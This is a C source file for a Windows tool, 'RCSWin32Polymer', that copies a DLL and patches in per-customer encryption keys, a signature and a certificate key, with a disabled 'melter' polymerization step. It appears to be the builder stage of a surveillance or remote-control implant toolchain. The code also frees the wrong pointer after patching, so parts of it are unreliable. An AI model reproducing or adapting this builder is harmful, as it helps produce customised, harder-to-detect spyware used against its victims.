
#include "stdafx.h"
#include <Windows.h>
#include <openssl/md5.h>
#include <openssl/pem.h>
#include "polymer.h"
#include "peutils.h"

int SetAES_Passkey(WCHAR *filename, CHAR * pPassKey, CHAR *MARK);
int SetASP_Signature(WCHAR * filename, CHAR * signature);
int SetCert_Signature(WCHAR * filename, WCHAR * cert);

int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hMelter = NULL;
	HANDLE hFile;
	// PolymerT fPolymer;
	CHAR szSignature[256];
	CHAR szLogPassword[256];
	CHAR szConfPassword[256];
	WCHAR wsCertFile[MAX_PATH];
	WCHAR wsDllFile[MAX_PATH];
	WCHAR wsOutFile[MAX_PATH];
	
	if (argc != 7) {
		printf("ERROR: \n");
		printf("  usage:  RCSWin32Polymer.exe  <log_pass> <conf_pass> <sig> <cert> <dll> <output>\n\n");
		printf("  <log_pass> is the password for the log encryption\n");
		printf("  <conf_pass> is the password for the config encryption\n");
		printf("  <sig> is the customer signature\n");
		printf("  <cert> is the ASP certificate\n");
		printf("  <dll> is the dll to be polymerized\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}

	sprintf_s(szLogPassword, sizeof(szLogPassword), "%S", argv[1]);
	sprintf_s(szConfPassword, sizeof(szConfPassword), "%S", argv[2]);
	sprintf_s(szSignature, sizeof(szSignature), "%S", argv[3]);
	wsprintf(wsCertFile, L"%s", argv[4]);
	wsprintf(wsDllFile, L"%s", argv[5]);
	wsprintf(wsOutFile, L"%s", argv[6]);

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	if (strlen(szSignature) < SIGNATURE_LEN) {
		printf("Signature should be at least %d characters\n", SIGNATURE_LEN);
		return ERROR_EMBEDDING;
	}

	if ( (hFile = CreateFile(wsCertFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find certificate file [%S]\n", wsCertFile);
		return ERROR_EMBEDDING;
	} else {
		DWORD len = GetFileSize(hFile, NULL);
		if (len < PEM_KEY_LEN) {
			printf("Bad certificate file len [%S]\n", wsCertFile);
			return ERROR_EMBEDDING;
		}
		CloseHandle(hFile);
	}

#if 0
	if ((hMelter = LoadLibrary(POLYMERDLL)) == NULL) {
		printf("Cannot find the melter dll [%S]\n", POLYMERDLL);
		return ERROR_NO_MELTER;
	}

	if ((fPolymer = (PolymerT) GetProcAddress(hMelter, POLYFUNC)) == NULL) {
		printf("Cannot find the function in the melter [%S]\n", POLYFUNC);
		return ERROR_INVALID_MELTER;
	}
#endif

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/
	
	printf("Ready to go...\n");
	printf("LOG PASSWORD  [%s]\n", szLogPassword);
	printf("CONF PASSWORD [%s]\n", szConfPassword);
	printf("SIGNATURE     [%s]\n", szSignature);
	printf("CERTFILE      [%S]\n", wsCertFile);
	printf("INPUT DLL     [%S]\n", wsDllFile);
	printf("OUTPUT DLL    [%S]\n\n", wsOutFile);

	if (CopyFile(wsDllFile, wsOutFile, FALSE) == FALSE) {
		printf("Cannot create output file[%S]\n", wsOutFile);
		return ERROR_OUTPUT;
	}

	/************************************************************************/
	/* BINARY PATCHING                                                      */
	/************************************************************************/

	if (SetAES_Passkey(wsOutFile, szLogPassword, AES_LOG_PASS_MARK) == 0) {
		printf("Cannot embed log password [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	} else {
		printf("Log Password embedded... ok\n");
	}

	if (SetAES_Passkey(wsOutFile, szConfPassword, AES_CONF_PASS_MARK) == 0) {
		printf("Cannot embed conf password [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	} else {
		printf("Conf Password embedded... ok\n");
	}

	if (SetASP_Signature(wsOutFile, szSignature) == 0) {
		printf("Cannot embed signature [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	} else {
		printf("Signature embedded... ok\n");
	}

	if (SetCert_Signature(wsOutFile, wsCertFile) == 0) {
		printf("Cannot embed pem certificate [%S]\n", wsCertFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	} else {
		printf("PEM certificate embedded... ok\n");
	}

	/************************************************************************/
	/* POLYMER                                                              */
	/************************************************************************/

#if 0
	try {
		fPolymer(wsOutFile);
	} catch (...) {
		printf("Error while running polymerization\n");
		DeleteFile(wsOutFile);
		return ERROR_POLYMER;
	}
#endif
		
	printf("Output file polymerized... ok\n");

#if 0
	FreeLibrary(hMelter);
#endif

	return ERROR_SUCCESS;
}


int SetAES_Passkey(WCHAR *filename, CHAR * pPassKey, CHAR *MARK)
{
	int iRet = false;
	BYTE * pBlockPtr	= NULL;
	BYTE * pDataSect	= NULL;
	BYTE pPassMd5[32];
	unsigned int iLen = 0;

	pBlockPtr = (BYTE *) LoadPE(filename, &iLen);
	pDataSect = pBlockPtr;

	if( pBlockPtr == NULL )
		return iRet;

	__try {
		while ( pBlockPtr < (pDataSect + iLen) ) {

			if (!memcmp(pBlockPtr, MARK, AES_MARK_LEN) )
				break;
			else
				pBlockPtr++;
		}
	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
		pBlockPtr = NULL;
	}

	if ( pBlockPtr && (pBlockPtr < ( pDataSect + iLen - 1 )) ) {

		MD5((unsigned char *) pPassKey, (unsigned long) strlen(pPassKey) , (unsigned char *) pPassMd5);
		memcpy(pBlockPtr, pPassMd5, 16);
		iRet = true;

	} else {
		iRet = false;
	}

	UnloadPE(pBlockPtr);

	return iRet;
}


int SetCert_Signature(WCHAR * filename, WCHAR * cert)
{
	int iRet = false;
	BYTE * pBlockPtr = NULL;
	BYTE * pDataSect = NULL;
	BYTE passwd_b[]	 = PEM_CERT_MARK;
	FILE *fp = NULL;
	X509 *req = NULL;
	unsigned int iLen = 0;

	pBlockPtr = (BYTE *) LoadPE(filename, &iLen);
	pDataSect = pBlockPtr;

	if( pBlockPtr == NULL )
		return iRet;

	__try {
		while(  pBlockPtr < (pDataSect + iLen) ) {

			if( !memcmp(pBlockPtr,passwd_b, sizeof(passwd_b)) )
				break;
			else
				pBlockPtr++;
		}
	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
		pBlockPtr = NULL;
	}

	if( pBlockPtr  && (pBlockPtr <= ( pDataSect + iLen - PEM_KEY_LEN  ) )   ) {

		if((fp = _wfopen(cert, L"r")) == NULL) {
			UnloadPE(pBlockPtr);
			return FALSE;
		}

		if((req = PEM_read_X509(fp, NULL, NULL, NULL)) == NULL) {
			fclose(fp);
			UnloadPE(pBlockPtr);
			return FALSE;
		}

		if(!req->cert_info->key->public_key->data) {
			X509_free(req);
			fclose(fp);
			UnloadPE(pBlockPtr);
			return FALSE;
		}

		memcpy(pBlockPtr, req->cert_info->key->public_key->data, PEM_KEY_LEN);

		X509_free(req);
		fclose(fp);
		iRet = true;

	} else 
		iRet = false;

	UnloadPE(pBlockPtr);

	return iRet;
}


int SetASP_Signature(WCHAR * filename, CHAR * signature)
{
	int iRet = false;
	BYTE * pBlockPtr	= NULL;
	BYTE * pDataSect	= NULL;
	BYTE passwd_b[]		= SIGNATURE_MARK;
	BYTE pPassMd5[16];
	unsigned int iLen = 0;
	
	pBlockPtr = (BYTE *) LoadPE(filename, &iLen);
	pDataSect = pBlockPtr;
	
	if( pBlockPtr == NULL )
		return iRet;

	__try {
		while(  pBlockPtr < (pDataSect + iLen) ) {

			if( !memcmp(pBlockPtr, passwd_b, sizeof(passwd_b)) )
				break;
			else
				pBlockPtr++;
		}
	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
		pBlockPtr = NULL;
	}
	
	if( pBlockPtr  && (pBlockPtr < ( pDataSect + iLen - SIGNATURE_LEN ) )   ) {
		MD5((unsigned char *) signature, (unsigned long) strlen(signature) , (unsigned char *) pPassMd5);
		memcpy(pBlockPtr, pPassMd5, sizeof(pPassMd5));
		iRet = true;
	} else 
		iRet = false;

	UnloadPE(pBlockPtr);

	return iRet;
}
